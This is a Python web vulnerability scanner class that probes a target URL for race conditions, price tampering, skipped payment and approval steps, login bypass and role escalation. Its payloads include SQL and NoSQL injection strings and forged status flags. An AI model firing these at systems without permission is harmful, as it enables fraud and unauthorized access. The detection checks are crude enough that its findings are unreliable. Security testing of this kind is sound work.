
import requests
import time
import json
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, urlparse

class BusinessLogicTester:
    """Test for business logic vulnerabilities"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'BusinessLogic-Tester/1.0'
        })
        
        self.test_results = []
        
    def run_all_tests(self) -> Dict[str, Any]:
        """Run comprehensive business logic tests"""
        
        results = {
            'total_tests': 0,
            'vulnerabilities_found': 0,
            'test_results': [],
            'critical_findings': [],
            'recommendations': []
        }
        
        # Race condition tests
        race_results = self.test_race_conditions()
        results['test_results'].append(race_results)
        
        # Price manipulation tests
        price_results = self.test_price_manipulation()
        results['test_results'].append(price_results)
        
        # Workflow bypass tests
        workflow_results = self.test_workflow_bypass()
        results['test_results'].append(workflow_results)
        
        # Authentication bypass tests
        auth_results = self.test_authentication_bypass()
        results['test_results'].append(auth_results)
        
        # Authorization tests
        authz_results = self.test_authorization_flaws()
        results['test_results'].append(authz_results)
        
        # Session management tests
        session_results = self.test_session_management()
        results['test_results'].append(session_results)
        
        # Calculate totals
        for test_result in results['test_results']:
            results['total_tests'] += test_result.get('tests_run', 0)
            results['vulnerabilities_found'] += test_result.get('vulnerabilities', 0)
            
            if test_result.get('critical_findings'):
                results['critical_findings'].extend(test_result['critical_findings'])
        
        return results
    
    def test_race_conditions(self) -> Dict[str, Any]:
        """Test for race condition vulnerabilities"""
        results = {
            'test_name': 'Race Condition Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Common endpoints vulnerable to race conditions
        test_endpoints = [
            '/api/purchase', '/api/transfer', '/api/withdraw',
            '/api/vote', '/api/like', '/api/submit', '/api/redeem',
            '/buy', '/transfer', '/vote', '/coupon', '/gift'
        ]
        
        for endpoint in test_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            results['tests_run'] += 1
            
            # Test concurrent requests
            if self._test_concurrent_requests(test_url):
                results['vulnerabilities'] += 1
                results['findings'].append({
                    'type': 'Race Condition',
                    'location': test_url,
                    'severity': 'High',
                    'description': 'Endpoint vulnerable to race condition attacks'
                })
                
                results['critical_findings'].append(f"Race condition vulnerability: {test_url}")
        
        return results
    
    def _test_concurrent_requests(self, url: str) -> bool:
        """Test if endpoint is vulnerable to race conditions"""
        import threading
        import queue
        
        response_queue = queue.Queue()
        
        def make_request():
            try:
                response = self.session.post(url, 
                    json={'amount': 1, 'action': 'test'},
                    timeout=5
                )
                response_queue.put({
                    'status_code': response.status_code,
                    'response_time': response.elapsed.total_seconds(),
                    'content_length': len(response.text)
                })
            except:
                response_queue.put(None)
        
        # Launch 10 concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Analyze responses
        responses = []
        while not response_queue.empty():
            response = response_queue.get()
            if response:
                responses.append(response)
        
        # Check for signs of race condition vulnerability
        if len(responses) >= 5:
            # Look for inconsistent responses
            status_codes = [r['status_code'] for r in responses]
            content_lengths = [r['content_length'] for r in responses]
            
            # If we get different status codes or content lengths, might be vulnerable
            return len(set(status_codes)) > 1 or len(set(content_lengths)) > 1
        
        return False
    
    def test_price_manipulation(self) -> Dict[str, Any]:
        """Test for price manipulation vulnerabilities"""
        results = {
            'test_name': 'Price Manipulation Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Price manipulation test cases
        test_cases = [
            {'price': -1, 'description': 'Negative price'},
            {'price': 0, 'description': 'Zero price'},
            {'price': 0.01, 'description': 'Minimal price'},
            {'price': '1e-10', 'description': 'Scientific notation'},
            {'price': 'null', 'description': 'Null price'},
            {'price': '', 'description': 'Empty price'},
            {'price': 'undefined', 'description': 'Undefined price'}
        ]
        
        # Common price-related endpoints
        price_endpoints = [
            '/api/cart/add', '/api/purchase', '/api/checkout',
            '/cart', '/buy', '/order', '/payment'
        ]
        
        for endpoint in price_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            
            for test_case in test_cases:
                results['tests_run'] += 1
                
                try:
                    response = self.session.post(test_url,
                        json={
                            'item_id': 1,
                            'quantity': 1,
                            'price': test_case['price']
                        },
                        timeout=5
                    )
                    
                    # Check if manipulation was accepted
                    if response.status_code in [200, 201, 202]:
                        if 'success' in response.text.lower() or 'added' in response.text.lower():
                            results['vulnerabilities'] += 1
                            results['findings'].append({
                                'type': 'Price Manipulation',
                                'location': test_url,
                                'severity': 'Critical',
                                'description': f"Price manipulation possible: {test_case['description']}",
                                'test_case': test_case
                            })
                            
                            results['critical_findings'].append(
                                f"Price manipulation: {test_url} accepts {test_case['description']}"
                            )
                
                except Exception:
                    continue
        
        return results
    
    def test_workflow_bypass(self) -> Dict[str, Any]:
        """Test for workflow bypass vulnerabilities"""
        results = {
            'test_name': 'Workflow Bypass Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Common workflow bypass scenarios
        bypass_tests = [
            {
                'name': 'Skip payment step',
                'endpoints': ['/api/order/confirm', '/api/checkout/complete'],
                'payload': {'status': 'paid', 'payment_confirmed': True}
            },
            {
                'name': 'Skip verification step',
                'endpoints': ['/api/user/activate', '/api/account/verify'],
                'payload': {'verified': True, 'status': 'active'}
            },
            {
                'name': 'Skip approval process',
                'endpoints': ['/api/request/approve', '/api/application/accept'],
                'payload': {'approved': True, 'status': 'approved'}
            }
        ]
        
        for test in bypass_tests:
            for endpoint in test['endpoints']:
                test_url = urljoin(self.target_url, endpoint)
                results['tests_run'] += 1
                
                try:
                    response = self.session.post(test_url,
                        json=test['payload'],
                        timeout=5
                    )
                    
                    if response.status_code in [200, 201, 202]:
                        if any(keyword in response.text.lower() 
                              for keyword in ['success', 'confirmed', 'approved', 'activated']):
                            
                            results['vulnerabilities'] += 1
                            results['findings'].append({
                                'type': 'Workflow Bypass',
                                'location': test_url,
                                'severity': 'High',
                                'description': f"Workflow bypass possible: {test['name']}"
                            })
                            
                            results['critical_findings'].append(
                                f"Workflow bypass: {test_url} - {test['name']}"
                            )
                
                except Exception:
                    continue
        
        return results
    
    def test_authentication_bypass(self) -> Dict[str, Any]:
        """Test for authentication bypass vulnerabilities"""
        results = {
            'test_name': 'Authentication Bypass Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Authentication bypass techniques
        bypass_methods = [
            {'method': 'SQL Injection', 'payload': {"username": "admin'--", "password": "anything"}},
            {'method': 'NoSQL Injection', 'payload': {"username": {"$ne": ""}, "password": {"$ne": ""}}},
            {'method': 'JSON Parameter', 'payload': {"username": "admin", "password": "wrong", "admin": True}},
            {'method': 'Boolean Bypass', 'payload': {"username": "admin", "password": "", "authenticated": True}},
            {'method': 'Empty Password', 'payload': {"username": "admin", "password": ""}},
            {'method': 'Null Password', 'payload': {"username": "admin", "password": None}}
        ]
        
        # Authentication endpoints
        auth_endpoints = [
            '/api/login', '/api/auth', '/api/signin',
            '/login', '/auth', '/signin', '/api/authenticate'
        ]
        
        for endpoint in auth_endpoints:
            test_url = urljoin(self.target_url, endpoint)
            
            for method in bypass_methods:
                results['tests_run'] += 1
                
                try:
                    response = self.session.post(test_url,
                        json=method['payload'],
                        timeout=5
                    )
                    
                    # Check for successful authentication
                    success_indicators = ['token', 'session', 'authenticated', 'login successful', 'welcome']
                    
                    if response.status_code in [200, 201] and any(
                        indicator in response.text.lower() for indicator in success_indicators
                    ):
                        results['vulnerabilities'] += 1
                        results['findings'].append({
                            'type': 'Authentication Bypass',
                            'location': test_url,
                            'severity': 'Critical',
                            'description': f"Authentication bypass via {method['method']}",
                            'payload': method['payload']
                        })
                        
                        results['critical_findings'].append(
                            f"Auth bypass: {test_url} - {method['method']}"
                        )
                
                except Exception:
                    continue
        
        return results
    
    def test_authorization_flaws(self) -> Dict[str, Any]:
        """Test for authorization vulnerabilities"""
        results = {
            'test_name': 'Authorization Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Test privilege escalation
        privilege_tests = [
            {
                'name': 'Role escalation',
                'payload': {'role': 'admin', 'privileges': ['admin']},
                'endpoints': ['/api/user/update', '/api/profile/edit']
            },
            {
                'name': 'Direct object access',
                'payload': {'user_id': 1, 'admin': True},
                'endpoints': ['/api/user/1', '/api/admin/users/1']
            }
        ]
        
        for test in privilege_tests:
            for endpoint in test['endpoints']:
                test_url = urljoin(self.target_url, endpoint)
                results['tests_run'] += 1
                
                try:
                    # Try with different HTTP methods
                    for method in ['PUT', 'PATCH', 'POST']:
                        response = self.session.request(method, test_url,
                            json=test['payload'],
                            timeout=5
                        )
                        
                        if response.status_code in [200, 201, 202]:
                            results['vulnerabilities'] += 1
                            results['findings'].append({
                                'type': 'Authorization Flaw',
                                'location': f"{method} {test_url}",
                                'severity': 'High',
                                'description': f"Authorization bypass: {test['name']}"
                            })
                            
                            results['critical_findings'].append(
                                f"Authorization flaw: {method} {test_url}"
                            )
                            break
                
                except Exception:
                    continue
        
        return results
    
    def test_session_management(self) -> Dict[str, Any]:
        """Test session management vulnerabilities"""
        results = {
            'test_name': 'Session Management Testing',
            'tests_run': 0,
            'vulnerabilities': 0,
            'findings': [],
            'critical_findings': []
        }
        
        # Session fixation test
        results['tests_run'] += 1
        if self._test_session_fixation():
            results['vulnerabilities'] += 1
            results['findings'].append({
                'type': 'Session Fixation',
                'location': self.target_url,
                'severity': 'Medium',
                'description': 'Application vulnerable to session fixation'
            })
        
        # Session timeout test
        results['tests_run'] += 1
        if self._test_session_timeout():
            results['vulnerabilities'] += 1
            results['findings'].append({
                'type': 'Session Timeout',
                'location': self.target_url,
                'severity': 'Low',
                'description': 'Session timeout not properly implemented'
            })
        
        return results
    
    def _test_session_fixation(self) -> bool:
        """Test for session fixation vulnerability"""
        try:
            # Get initial session
            response1 = self.session.get(self.target_url)
            initial_cookies = dict(self.session.cookies)
            
            # Try to login (this would need to be adapted to actual login)
            login_url = urljoin(self.target_url, '/login')
            self.session.post(login_url, data={'username': 'test', 'password': 'test'})
            
            # Check if session ID changed
            final_cookies = dict(self.session.cookies)
            
            # If session cookies are the same, might be vulnerable to fixation
            return initial_cookies == final_cookies
            
        except Exception:
            return False
    
    def _test_session_timeout(self) -> bool:
        """Test if proper session timeout is implemented"""
        try:
            # This is a simplified test - in reality you'd need valid sessions
            protected_url = urljoin(self.target_url, '/admin')
            response = self.session.get(protected_url)
            
            # Wait and try again to see if session persists
            time.sleep(2)
            response2 = self.session.get(protected_url)
            
            # If we still get access after time, might indicate long/no timeout
            return response.status_code == response2.status_code == 200
            
        except Exception:
            return False
